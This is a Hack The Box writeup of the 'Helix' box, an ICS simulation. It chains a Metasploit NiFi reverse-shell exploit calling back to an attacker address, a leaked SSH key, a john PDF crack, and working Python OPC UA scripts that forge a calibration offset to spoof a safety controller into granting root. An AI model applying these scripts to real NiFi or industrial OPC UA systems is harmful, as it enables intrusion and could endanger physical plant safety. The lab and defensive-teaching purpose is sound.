---
title: "Helix — HackTheBox Writeup"
date: 2026-09-20
author: "Angus Dawson"
tags: ["HTB","Linux","ICS","OT","OPC UA","Apache NiFi","Metasploit","SSH","john","Safety Instrumented System","CWE-807","Privilege Escalation"]
categories: ["CTF Writeups"]
difficulty: "Medium"
platform: "Hack The Box"
os: "Linux"
featured: true
featured_weight: 1
summary: "A Linux box modelling an industrial plant, where the privilege escalation is not a CVE but the plant's own safety logic being fed a forged sensor reading. Unauthenticated Apache NiFi → operator SSH key in support-bundles → password-cracked PLC manual → anonymous OPC UA writes → CalibrationOffset ramped into the maintenance window → helix-maint-console → root."
images: ["/images/helix/helix.png"]
cover:
  image: "/images/helix/helix.png"
  alt: "Helix HTB image"
  caption: "Helix - CTF - Hack The Box"
  relative: true
  hidden: false

---

> **Spoiler warning**: This writeup documents my playthrough of the retired Hack The Box machine **Helix**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Ubuntu 22.04.5 LTS — an OT/ICS simulation fronting a nuclear plant HMI, an OPC UA server and a safety controller
- **Focus:** vhost discovery → unauthenticated Apache NiFi processor RCE → SSH private key recovered from a leftover support bundle → offline PDF password cracking → OPC UA address-space enumeration → process-variable spoofing to satisfy an authorisation check → root
- **Difficulty:** Medium

---

## Recon

`helix.htb` goes into `/etc/hosts` first so every command can use the name:

```bash
echo "10.129.9.96 helix.htb" | sudo tee -a /etc/hosts
```

Initial scan:

```bash
nmap -sC -sV 10.129.9.96 -oN nmap-scan
```

**Result highlights (relevant lines)**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Helix Industries | Industrial Automation & Critical Infrastruc ...
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports only, so the web service is the whole game. The `Service Info` line is a guess rather than an OS fingerprint (no `-O` was run), but the OpenSSH banner already pins the box to Ubuntu.

![Nmap service scan against Helix](/images/helix/nmap_scan.png)

Port 80 is a corporate brochure site for "Helix Industries", an industrial automation contractor. Nothing exploitable, but the theme matters: everything later is dressed as plant equipment.

![The Helix Industries corporate site on port 80](/images/helix/helix.htb.png)

One vhost, nothing else exposed. Fuzz the `Host` header, filtering out the 154-byte default response:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154 -u http://helix.htb:80/ -H 'Host: FUZZ.helix.htb'
```

One name survives the filter out of 4,989 candidates:

```text
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 451ms]
```

![ffuf discovering the flow vhost](/images/helix/ffuf_output.png)

`flow` is what Apache NiFi calls its pipelines. Add the vhost so the browser and Metasploit both reach it:

```bash
echo "10.129.9.96 flow.helix.htb" | sudo tee -a /etc/hosts
```

![Adding the flow vhost to /etc/hosts](/images/helix/add_host.png)

---

## Foothold: an unauthenticated NiFi canvas

`flow.helix.htb/nifi/` loads the NiFi canvas directly: no login page, no user in the toolbar. The app treats the browser as a fully privileged anonymous caller. Two processors are on the canvas, `ExecuteSQL` feeding `LogAttribute`, both version `1.21.0`.

![The unauthenticated Apache NiFi canvas at flow.helix.htb](/images/helix/apache_nifi.png)

**Why this is remote code execution.** NiFi builds dataflows out of *processors* driven by a REST API under `/nifi-api`, and some processors run OS commands as their whole job: `ExecuteProcess`, `ExecuteStreamCommand`, `ExecuteScript`. That is a feature, and Apache says so explicitly. The catch is that NiFi only enforces authentication over HTTPS. Served over plain HTTP with no access control, as here, anyone who reaches `/nifi-api` can drop in a processor and run a command. No exploit, just an intended feature left open.

1.21.0 also sits inside the range of two real bugs, **CVE-2023-34468** (H2 JDBC RCE) and **CVE-2023-34212** (JNDI deserialisation), both fixed in 1.22.0. Neither is needed here.

Metasploit automates the whole processor dance. It defaults to `RPORT 8080`, so correct the port and set the vhost explicitly, since nginx routes by `Host` header:

```bash
msfconsole
```

```text
msf6 > use exploit/multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/apache_nifi_processor_rce) > set VHOST flow.helix.htb
msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 80
msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 10.129.9.96
```

The `cmd/unix/reverse_bash` line is the module's default payload, printed on `use`. Leave `TARGETURI` at `/` too: the module appends `nifi-api` itself, so pointing it at the API path would request `/nifi-api/nifi-api/processors` and 404.

![Selecting the NiFi processor RCE module and setting the target](/images/helix/msfconsole.png)

Set the callback and run:

```text
msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 10.10.14.98
msf6 exploit(multi/http/apache_nifi_processor_rce) > set LPORT 9999
msf6 exploit(multi/http/apache_nifi_processor_rce) > run
[*] Started reverse TCP handler on 10.10.14.98:9999
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Apache NiFi instance does not support logins
[*] Command shell session 1 opened (10.10.14.98:9999 -> 10.129.9.96:47338)
[*] Waiting 5 seconds before stopping and deleting
[+] Processor Stop sent successfully
[+] Processor Delete sent successfully
```

The `could not be validated` warning is confirmation, not a problem: the check asks whether the instance supports logins, this one doesn't, and Metasploit can't verify `ExecuteProcess` is reachable without actually creating a processor, which `run` does next anyway. It creates the processor, fires the payload, then stops and deletes it. That cleans the canvas, not the evidence: the flow-configuration history and `nifi-app.log` both keep a record.

![Metasploit landing a shell and cleaning up the processor](/images/helix/msfconsole2.png)

The session lands as the service account, in the NiFi install directory:

```text
whoami
nifi
nifi@helix:/opt/nifi-1.21.0$ pwd
/opt/nifi-1.21.0
```

![Command shell as the nifi service account](/images/helix/nifi_shell.png)

---

## nifi → operator: a key left in a support bundle

First look at where the shell landed. It's the stock NiFi tree (`bin`, `conf`, `lib`, the repositories) plus one directory that ships with no NiFi release: `support-bundles/`. NiFi's diagnostics command writes to a file you name; it never creates this. Someone made it by hand, which is reason enough to look inside:

```bash
ls -l /opt/nifi-1.21.0/support-bundles/
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

```text
-rw-r----- 1 nifi nifi 411 Jan 25  2026 operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

411 bytes, owned by `nifi`, readable by the account we already have, and the filename names its owner. Exactly the kind of thing that gets staged for a support ticket and never cleaned up.

![The operator private key staged in NiFi's support-bundles directory](/images/helix/ssh_key.png)

Save it locally, `chmod 600`, and use it:

```bash
ssh -i operator_id_ed25519 operator@helix.htb
```

```text
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
operator@helix:~$
```

![SSH session as operator using the recovered key](/images/helix/operator-shell.png)

The user flag is in the home directory:

```interactive shell
operator@helix:~$ cat /home/operator/user.txt
```

`e69d8859993cc0263f10c15cac077d29`

![User flag read from the operator home directory](/images/helix/user_flag.png)

---

## The operator's documents

`operator`'s home holds two files that are clearly meant to be read rather than executed:

```bash
ls -l
```

```text
-rw------- 1 operator operator 920611 Jan 26  2026 'control systems diagram.png'
-rw-rw-r-- 1 operator operator  28453 Apr 16 08:50 'Operator Control & Safety Guide.pdf'
-rw-r----- 1 root     operator     33 Sep 19 01:28  user.txt
```

![The operator home directory holding the plant documentation](/images/helix/privile_escalation.png)

Pull both down, escaping the spaces and ampersand in the names:

```bash
scp -i operator_id_ed25519 \
  operator@helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf .

scp -i operator_id_ed25519 \
  operator@helix.htb:/home/operator/control\ systems\ diagram.png .
```

![Transferring the plant documentation off the target with scp](/images/helix/scp.png)

The diagram maps everything that follows. An OPC UA server at `opc.tcp://127.0.0.1:4840/helix/` sits between an operator station, a remote client, and three subsystems: Reactor, Control, Safety. Every point is marked writable (pencil) or read-only (padlock). Per the vendor, `Calibration Offset`, `Mode`, `Test Override` and `Reset Trip` are writable; `Trip Active`, `Rods Inserted` and `Emergency Cooling` are not.

The address matters: `127.0.0.1` means the OPC UA server is loopback-only, reachable only from the box or through a tunnel. The operator shell is a prerequisite, not a convenience.

![The vendor's control systems diagram, with every point marked writable or read-only](/images/helix/control_systems_diagram.png)

The PDF is password protected:

![The Operator Control & Safety Guide refusing to open without a password](/images/helix/pdf_pw_protected.png)

A PDF's encryption key is derived from its password, so the file itself is enough for an offline crack. `pdf2john` pulls out the hash:

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

![Extracting the PDF hash and running it against rockyou](/images/helix/pdf2john.png)

rockyou has it. `john --show` reads the answer back out of the pot file:

```bash
john --show pdf.hash
```

```text
Operator Control & Safety Guide.pdf:operator1

1 password hash cracked, 0 left
```

The password is `operator1`.

![john revealing the cracked PDF password](/images/helix/pdf2john-password.png)

---

## Reading the PLC specification

The decrypted guide reads like an exploit written out in advance by the vendor. Six sections matter.

**Section 3 — Normal Operating Mode.** In `NORMAL`, the PLC ignores any calibration offset or override. So the mode has to change first; writing the offset before that does nothing. Order matters.

![Section 3 of the guide defining NORMAL mode behaviour](/images/helix/operating_mode.png)

**Section 4 — Safety Trip Logic.** A trip fires at roughly ≥ 305 °C or ≥ 75 bar. It sets `TripActive` true, locks the control logic, and is **latched**: it will not clear on its own.

![Section 4 of the guide listing the internal trip thresholds](/images/helix/safety_trip_logic.png)

**Section 5 — Trip Reset Conditions.** Clearing it needs *all* of: below ~288 °C, below ~70 bar, mode `NORMAL`, `TestOverride` off, and `CalibrationOffset` back to `0.0`. Only then is `ResetTrip` honoured. That is what stops an operator riding through an unsafe state.

![Section 5 of the guide defining the trip reset conditions](/images/helix/trip_reset_conditions.png)

**Section 6 — Maintenance Mode & Safety Window.** Three ordered steps: set `Mode` to `MAINTENANCE`, enable `TestOverride`, then adjust `CalibrationOffset`. The trip logic stays live throughout: `MAINTENANCE` allows diagnostics, it does not switch safety off.

![Section 6 of the guide describing how to enter maintenance mode](/images/helix/maintenance_window.png)

**Section 7 — Maintenance Operating Window.** A *maintenance operating window* opens at roughly 295 °C or 73 bar, as long as both stay below the trip and no trip is active. It sits **above** normal operation but **below** the trip: a deliberately narrow band.

![Section 7 of the guide defining the maintenance operating window](/images/helix/maintenance_window2.png)

**Section 8 — Behavior During CalibrationOffset Ramp.** Raise the offset gradually and temperature climbs predictably. Raise it too fast and the PLC trips, and once tripped it ignores further offset writes.

![Section 8 of the guide describing the calibration offset ramp](/images/helix/callibration_offset.png)

Sections 4, 6 and 7 are the three that fix the target band: get into `MAINTENANCE` with `TestOverride` on, then land the temperature somewhere between roughly 295 °C and 305 °C. Ten degrees wide, with a latched trip on the far side.

---

## Internal services

The guide describes an OPC UA server and an HMI. Both are listening, and neither is exposed:

```bash
ss -tnlp
```

```text
State   Recv-Q  Send-Q       Local Address:Port      Peer Address:Port  Process
LISTEN  0       100               127.0.0.1:4840              0.0.0.0:*
LISTEN  0       50                127.0.0.1:37083             0.0.0.0:*
LISTEN  0       50                127.0.0.1:8080              0.0.0.0:*
LISTEN  0       128               127.0.0.1:8081              0.0.0.0:*
LISTEN  0       4096          127.0.0.53%lo:53                0.0.0.0:*
LISTEN  0       128                 0.0.0.0:22                0.0.0.0:*
LISTEN  0       511                 0.0.0.0:80                0.0.0.0:*
LISTEN  0       50       [::ffff:127.0.0.1]:40769                  *:*
LISTEN  0       128                    [::]:22                  [::]:*
```

`4840` is OPC UA, `8081` is something new; the rest is background (resolved's stub, an ephemeral port, the IPv6 twin of `22`). Only `22` and `80` bind a public address, which is what the scan saw. The empty Process column is just our unprivileged view: we see the sockets but not their owners.

![Enumerating loopback listeners as operator](/images/helix/internal_network.png)

```bash
curl 127.0.0.1:8081
```

```text
<!doctype html><html><head>
<title>Helix HMI — Reactor Panel</title>
```

![Confirming the HMI on loopback port 8081](/images/helix/verify_curl.png)

Forward it out so the dashboard is readable in a browser:

```bash
ssh -i operator_id_ed25519 -L 8081:127.0.0.1:8081 operator@helix.htb
```

![Forwarding the HMI to the attacker host over SSH](/images/helix/port_fwd.png)

The dashboard at `http://127.0.0.1:8081/` is the live state of everything the guide described, and it opens with a warning:

> Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when safety controller authorizes it under hazardous test conditions.

Reactor reads `279.0 °C` and `68.75 bar`, with `Raw Temp` and `CalibrationOffset: 0.0 °C` broken out separately below. Mode is `NORMAL`. The **Privileged Maintenance Window** panel reads `Status: CLOSED` and spells out the gate: opened by the safety controller only on a hazardous test condition (Temp ≥ 295 °C or Pressure ≥ 73 bar) while still below trip.

The two separate values are the tell: displayed temperature is raw plus offset, and the offset is writable.

![The Helix reactor HMI with the maintenance window closed](/images/helix/reactor_dashboard.png)

---

## The sudo rule

```bash
sudo -l
```

```text
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:..., use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

One NOPASSWD rule, no argument restriction. The `Defaults` line shuts the usual side doors: `env_reset` and a fixed `secure_path` kill environment and `PATH` tricks, `use_pty` blocks TTY attacks. No shortcut; the binary is the intended route.

![The sudo rule granting operator access to helix-maint-console](/images/helix/sudo_permissions.png)

Running it does nothing at all:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
Maintenance window CLOSED.
```

![helix-maint-console refusing to run while the window is shut](/images/helix/maint-console_closed.png)

**Why this works.** The whole box is a chain. `helix-maint-console` grants root only when the plant is in a hazardous test condition. It asks the safety controller, which reads the reported temperature, which is raw temperature plus `CalibrationOffset` — a writable OPC UA node on a server that accepts anyone. Nothing physical changes; we forge the reading the authorisation decision trusts. That is **CWE-807, Reliance on Untrusted Inputs in a Security Decision**: the same mistake as trusting a cookie or a hidden form field, wearing a lab coat.

---

## OPC UA: mapping the address space

An OPC UA server exposes an *address space*: Object nodes give structure, Variable nodes hold values. Browsing from the `Objects` folder down is how you learn what a plant exposes. ATT&CK for ICS calls it **T0861, Point & Tag Identification**.

The server is loopback-only, so the scripts get written locally and dropped into `/tmp` on the target. First, find the `Plant` object and list its children:

```python
import asyncio
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(URL) as c:
        objs = await c.nodes.objects.get_children()

        plant = None
        for n in objs:
            bn = await n.read_browse_name()
            if bn.Name == "Plant":
                plant = n
                break

        if not plant:
            print("[!] 'Plant' not found under Objects")
            return

        print(f"[+] Found Plant: {plant.nodeid}\n")
        for ch in await plant.get_children():
            bn = await ch.read_browse_name()
            print(f"Plant.{bn.Name} → {ch.nodeid}")

asyncio.run(main())
```

![The plant_enum.py address-space enumeration script](/images/helix/plant_enum_python.png)

`Client(URL)` is given no security policy and no user token. asyncua defaults to `SecurityPolicy None` and an `Anonymous` token, and the connection succeeds, so the server accepts both. Two separate failures: an unencrypted channel, and no user authentication.

```text
operator@helix:/tmp$ python3 plant_enum.py
[+] Found Plant: NodeId(Identifier=1, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)

Plant.Reactor → NodeId(Identifier=2, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
Plant.Safety → NodeId(Identifier=7, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
Plant.Control → NodeId(Identifier=11, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
```

![plant_enum.py returning the three plant subsystems](/images/helix/plant_enum_out.png)

Structure matches the diagram. The more useful question is what this *session* may write.

Every Variable node has an `AccessLevel` and a `UserAccessLevel`, each a byte of bits: bit 0 is CurrentRead, bit 1 (`0x02`) is CurrentWrite. `AccessLevel` is what the node supports in the abstract; `UserAccessLevel` is the same with this session's rights applied. So testing bit 1 of `UserAccessLevel` asks what *I* can actually write, not what the node advertises:

```python
# plant_write_enum.py
import asyncio

from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def writable(node):
    try:
        ual = await node.read_attribute(ua.AttributeIds.UserAccessLevel)
        bits = int(ual.Value.Value)
    except Exception:
        al = await node.read_attribute(ua.AttributeIds.AccessLevel)
        bits = int(al.Value.Value)
    return bool(bits & 0x02)  # write bit

async def walk(node, path):
    try:
        kids = await node.get_children()
    except Exception:
        return

    for k in kids:
        try:
            name = (await k.read_browse_name()).Name
        except Exception:
            name = str(k.nodeid)

        new_path = f"{path}.{name}"
        try:
            nc = await k.read_node_class()
        except Exception:
            nc = None

        if nc == ua.NodeClass.Variable:
            try:
                if await writable(k):
                    print(f"[W] {new_path} → {k.nodeid}")
            except Exception:
                pass

        await walk(k, new_path)

async def main():
    async with Client(URL) as c:
        await walk(c.nodes.objects, "Objects")

asyncio.run(main())
```

![The writable-node enumeration logic in plant_write_enum.py](/images/helix/plant_write_python.png)

![The recursive walk and entry point of plant_write_enum.py](/images/helix/plant_write_python2.png)

```text
operator@helix:/tmp$ python3 plant_write_enum.py
[W] Objects.Plant.Reactor.CalibrationOffset → NodeId(Identifier=6, ...)
[W] Objects.Plant.Safety.RodsInserted → NodeId(Identifier=8, ...)
[W] Objects.Plant.Safety.EmergencyCooling → NodeId(Identifier=9, ...)
[W] Objects.Plant.Control.Mode → NodeId(Identifier=12, ...)
[W] Objects.Plant.Control.TestOverride → NodeId(Identifier=13, ...)
[W] Objects.Plant.Control.ResetTrip → NodeId(Identifier=14, ...)
```

![plant_write_enum.py listing every node the operator session can write](/images/helix/plant_write_out.png)

Two things stand out.

First, the identifier gaps. The writable nodes are 6, 8, 9, 12, 13, 14; nothing for 3, 4, 5 or 10, which is where `Temperature`, `Pressure` and `TripActive` live. So the server does enforce read-only on some nodes. It isn't just granting write to everything.

Second, and because of that: **`Safety.RodsInserted` and `Safety.EmergencyCooling` are writable**, though the diagram padlocks both. The documented model and the real ACLs disagree. We don't need them for root, but someone out to cause damage would: writing emergency cooling is far worse than a shell.

One caveat: `writable()` falls back to `AccessLevel` on any exception, so a node with a null `UserAccessLevel` gets judged on the server-wide value instead of ours. Either way the attribute only gives candidates, since a write can still come back `BadUserAccessDenied`. The write attempt is the real proof.

---

## First attempt: the ramp that trips

The guide's procedure is three steps, so start with the first two:

```python
import asyncio
from asyncua import Client

async def main():
    async with Client(url="opc.tcp://127.0.0.1:4840/helix/") as c:
        mode = await c.nodes.objects.get_child(["2:Plant","2:Control","2:Mode"])
        ov   = await c.nodes.objects.get_child(["2:Plant","2:Control","2:TestOverride"])
        await mode.write_value("MAINTENANCE")
        await ov.write_value(True)

asyncio.run(main())
```

![enable_test_override.py arming maintenance mode](/images/helix/enable_test_override_script.png)

Then ramp the offset a degree at a time, watching for a trip:

```python
# caloffset.py
import asyncio
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"

CAL   = "ns=2;i=6"   # CalibrationOffset
TEMP  = "ns=2;i=4"   # Temperature
PRESS = "ns=2;i=5"   # Pressure
TRIP  = "ns=2;i=10"  # TripActive

async def main():
    async with Client(URL) as c:
        cal   = c.get_node(CAL)
        temp  = c.get_node(TEMP)
        press = c.get_node(PRESS)
        trip  = c.get_node(TRIP)

        for _ in range(50):
            off = float(await cal.read_value())
            await cal.write_value(off + 1.0)
            await asyncio.sleep(1)
            t  = float(await temp.read_value())
            p  = float(await press.read_value())
            tr = bool(await trip.read_value())

            print(f"offset={off+1:.2f} temp={t:.2f}C press={p:.2f}bar trip={tr}")

            if tr:
                print("[!] TRIP hit, stopping")
                break

asyncio.run(main())
```

![The naive caloffset.py ramp script](/images/helix/caloffset_script.png)

It climbs steadily and then falls off the cliff:

```text
offset=19.00 temp=303.28C press=69.20bar trip=False
offset=20.00 temp=304.27C press=69.20bar trip=False
offset=21.00 temp=305.27C press=69.19bar trip=True
[!] TRIP hit, stopping
```

![caloffset.py latching the safety trip at 305.27 °C](/images/helix/caloffset_out.png)

Three observations.

The loop reads `TripActive` every iteration, so it isn't blind, but its only stopping rule fires after the trip has already latched. It detects the failure instead of avoiding it. It never checks whether it has climbed far enough, so it sails through the 295 °C window at offset 11 and keeps going.

Pressure barely moves: around 69.2 bar the whole way, never near the 73 bar window or the 75 bar trip. The "or 73 bar" clause is decorative here; temperature is the only variable that counts.

And the trip is now latched. Offset writes are ignored while `TripActive` holds, and it won't clear until the plant is back in the section 5 safe state.

---

## The working exploit

`exploit.py` fixes the stopping rule and adds a recovery path so the box is retryable after a trip:

```python
# exploit.py
import asyncio
import time

from asyncua import Client

ENDPOINT = "opc.tcp://127.0.0.1:4840/helix/"
OPEN_WINDOW_TEMP = 295.0
OPEN_WINDOW_PRESS = 73.0
TRIP_TEMP = 305.0
TRIP_PRESS = 75.0
SAFE_TEMP = 288.0
SAFE_PRESS = 70.0


async def find(parent, name):
    for ch in await parent.get_children():
        bn = await ch.read_browse_name()
        if bn.Name == name:
            return ch
    raise Exception(f"Missing node: {name}")


async def read_vals(temp, press, trip, mode, ov, cal):
    return (
        float(await temp.read_value()),
        float(await press.read_value()),
        bool(await trip.read_value()),
        await mode.read_value(),
        bool(await ov.read_value()),
        float(await cal.read_value()),
    )


async def main():
    async with Client(url=ENDPOINT) as c:
        plant = await find(c.nodes.objects, "Plant")
        reactor = await find(plant, "Reactor")
        control = await find(plant, "Control")
        safety = await find(plant, "Safety")
        mode = await find(control, "Mode")
        ov = await find(control, "TestOverride")
        reset_trip = await find(control, "ResetTrip")
        cal = await find(reactor, "CalibrationOffset")
        temp = await find(reactor, "Temperature")
        press = await find(reactor, "Pressure")
        trip = await find(safety, "TripActive")

        # ---- status ----
        t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
        print(
            f"[*] Current: temp={t:.2f}C press={p:.2f}bar trip={tr} "
            f"mode={m} override={o} offset={off:.2f}"
        )

        # ---- if tripped, reset cleanly ----
        if tr:
            print("[!] Trip is latched. Resetting to safe baseline...")
            await ov.write_value(False)
            await mode.write_value("NORMAL")
            await cal.write_value(0.0)
            await reset_trip.write_value(True)
            deadline = time.time() + 45
            while time.time() < deadline:
                t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
                print(
                    f"    temp={t:.2f}C press={p:.2f}bar trip={tr} "
                    f"mode={m} override={o} offset={off:.2f}"
                )
                if (not tr) and (t <= SAFE_TEMP) and (p <= SAFE_PRESS) and (m == "NORMAL"):
                    print("[+] Trip cleared and system is safe.")
                    break
                await asyncio.sleep(1)
            t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
            if tr:
                print("[!] Trip still TRUE. Leave it longer or wait for the 5-minute service reset.")
                return

        # ---- arm the vulnerable condition ----
        print("[*] Switching to MAINTENANCE + TestOverride...")
        await mode.write_value("MAINTENANCE")
        await ov.write_value(True)
        await cal.write_value(0.0)

        # ---- ramp offset slowly to open window but not trip ----
        print(
            "[*] Ramping CalibrationOffset toward the window (~295C/~73bar) "
            "without tripping (~305C/~75bar)..."
        )
        for step in [1.0] * 50:
            off = float(await cal.read_value())
            await cal.write_value(off + step)
            t, p, tr, m, o, off2 = await read_vals(temp, press, trip, mode, ov, cal)
            print(f"    offset={off2:.2f}  temp={t:.2f}C  press={p:.2f}bar  trip={tr}")
            if tr or t >= TRIP_TEMP or p >= TRIP_PRESS:
                await cal.write_value(max(-30.0, off2 - 3.0))
                print("[!] Too close / TRIP. Backed off.")
                return
            if (t >= OPEN_WINDOW_TEMP or p >= OPEN_WINDOW_PRESS) and not tr:
                print("[+] Window condition reached. Run NOW:")
                print("    sudo /usr/local/sbin/helix-maint-console")
                return
            await asyncio.sleep(1)

        print("[!] Didn't reach window within ramp. Wait a moment (MAINTENANCE drifts up) then rerun.")


if __name__ == "__main__":
    asyncio.run(main())
```

![The constants and helper functions of exploit.py](/images/helix/exploit_python1.png)

![The status read and trip-recovery block of exploit.py](/images/helix/exploit_python2.png)

Four differences from the naive version, in order of importance.

It checks the **window** condition after every step, not just the trip: `t >= OPEN_WINDOW_TEMP` stops the ramp the moment the door opens. It guards against the trip pre-emptively, backing the offset off by 3.0 instead of latching. If an earlier run already tripped, it resets to the section 5 safe state (override off, `NORMAL`, offset `0.0`, `ResetTrip`) and polls up to 45 seconds for the latch to clear before ramping again. And it resolves nodes by browse name through `find()` rather than hardcoding `ns=2;i=N`, since identifiers are a server detail but browse names come from the docs.

Two honest notes on that recovery block. The "5-minute service reset" in its last message is a guess: the run below never hit that branch, so I can't confirm it. If the 45-second poll doesn't clear a latch, just reset the box from the HTB panel. And the run below starts already clear at `NORMAL` with a zero offset, so the recovery branch is skipped this time. It earns its place on the runs where the plant is still tripped.

Run it:

```bash
python3 exploit.py
```

```text
[*] Current: temp=283.21C press=68.94bar trip=False mode=NORMAL override=False offset=0.00
[*] Switching to MAINTENANCE + TestOverride...
[*] Ramping CalibrationOffset toward the window (~295C/~73bar) without tripping (~305C/~75bar)...
    offset=1.00   temp=283.21C  press=68.94bar  trip=False
    ...
    offset=12.00  temp=294.81C  press=69.10bar  trip=False
    offset=13.00  temp=295.85C  press=69.10bar  trip=False
[+] Window condition reached. Run NOW:
    sudo /usr/local/sbin/helix-maint-console
```

![exploit.py ramping into the maintenance window without tripping](/images/helix/exploit_out.png)

Offset 13, not 21, and no trip. But 13 is **not** a fixed number: offset 1 read 285.31 °C on the failed run and 283.21 °C here, so the same offset lands on a different temperature each time. The loop has to read the measurement back each step and decide on that; aim at a fixed offset and you'll stop short or overshoot into the trip.

---

## Root via helix-maint-console

The window is open and the clock is running:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
[+] Privileged maintenance access granted
[!] Window expires in 82 seconds
[!] Session will be terminated automatically
root@helix:/tmp#
```

Eighty-two seconds is enough but not generous, and the shell opens in `/tmp`. Use the absolute path rather than finding out mid-countdown that `root/root.txt` is relative:

```interactive shell
root@helix:/tmp# cat /root/root.txt
```

`39771fb9dd2191a533dc10e84fd49432`

![Root shell granted by helix-maint-console and the root flag](/images/helix/root_access.png)

---

## Takeaways

- **An unauthenticated NiFi canvas is code execution as the service account.** `ExecuteProcess` and its siblings run OS commands by design, and NiFi only enforces auth over HTTPS, so plain HTTP with no access control hands every caller a shell. There's no patch because there's no bug: put NiFi behind TLS with authentication, and treat any open `/nifi-api` as already compromised.
- **Diagnostic directories leak secrets.** `operator_id_ed25519.bak` sat in `support-bundles/`, readable by the service account, and a private key staged for a ticket is a key in production. Audit those staging paths, and rotate anything that has ever been attached to a support case.
- **A password-protected document is an offline crack.** The PDF carries its own verifier, so once the file leaves the host the password is a john target, not access control. `operator1` fell to rockyou instantly. Protect documents that describe safety logic with real access control, not a passphrase.
- **Anonymous OPC UA is two failures, not one.** `SecurityPolicy None` is an unencrypted channel; an accepted `Anonymous` token is no user auth. Helix fixed neither, so one `Client(url)` reached mode, override, calibration and the safety trip alike. Enumerate `UserAccessLevel` bit 1 on your own servers to see what an anonymous session can really write.
- **The real ACLs disagreed with the diagram.** `Safety.RodsInserted` and `Safety.EmergencyCooling` are documented read-only but writable in practice, while `Temperature`, `Pressure` and `TripActive` genuinely are locked. A specific misconfiguration, not a blanket one. Diagrams describe intent; only enumeration describes reality, and the gap is where the finding lives.
- **A privilege decision must never read a value the attacker can write.** `helix-maint-console` grants root on reported temperature, and reported temperature is raw plus a `CalibrationOffset` writable over an anonymous session. No reactor was heated; the reading was forged. That is **CWE-807**, the same mistake as trusting a hidden form field, with a safety controller on the other end.
- **Drive off the reading, not the input.** Offset 1 measured 285.31 °C on one run and 283.21 °C on another, so 13 is a baseline artefact, not a constant. The naive loop only asked whether it had already tripped; the working one reads `Temperature` back after each write and stops on that. Steer a live process into a narrow band and you have to close the loop on the measurement, because the same input lands somewhere different every time.
- **Safety and security are different standards, and Helix fails both.** IEC 61511 wants the safety instrumented system independent of the control system, so one compromised path can't take out both. ISA/IEC 62443 wants that SIS in its own zone, reachable only through an authenticated conduit. Here a single anonymous session on the app tier reached the safety controller. Fixing the IT side alone, NiFi behind auth and the key rotated, would not have touched the part that matters.

---

## Resources

- [Apache NiFi — Security](https://nifi.apache.org/documentation/security/) — why command-executing processors are a feature, not a CVE
- [Rapid7 — apache_nifi_processor_rce](https://www.rapid7.com/db/modules/exploit/multi/http/apache_nifi_processor_rce/) — the create/start/stop/delete processor sequence
- [OPC UA Part 3 — AccessLevelType](https://reference.opcfoundation.org/Core/Part3/v105/docs/8.57) — CurrentRead is bit 0, CurrentWrite is bit 1
- [opcua-asyncio](https://opcua-asyncio.readthedocs.io/en/latest/) — the `asyncua` client used for every script here
- [CWE-807 — Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html) — the class the privesc belongs to
- [ISA/IEC 62443 series](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards) — zones, conduits and use control for industrial systems
- [MITRE ATT&CK for ICS — T0836 Modify Parameter](https://attack.mitre.org/techniques/T0836/) — the `CalibrationOffset` writes
- [MITRE ATT&CK for ICS — T0832 Manipulation of View](https://attack.mitre.org/techniques/T0832/) — the false temperature the safety controller consumed
- Hack The Box — retired machines archive
